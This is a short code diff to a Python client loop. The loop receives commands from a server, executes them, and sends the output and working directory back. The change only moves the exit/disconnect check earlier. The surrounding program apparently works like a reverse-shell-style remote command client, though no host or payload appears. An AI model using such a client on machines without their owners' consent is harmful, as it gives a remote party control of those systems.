@@ -62,6 +62,8 @@ def main():
             except:
                 break
             if command == "": continue
+            if command in ["exit", "disconnect"]:
+                break
             split_command = command.split()
             if command.lower() == "exit":
                 # if the command is exit, just break out of the loop
@@ -87,8 +89,6 @@ def main():
             # send the results back to the server
             send(output)
             send(cwd)
-            if command in ["exit", "disconnect"]:
-                break
         if command == "exit":
             break
     send(DISCONNECT_MESSAGE)
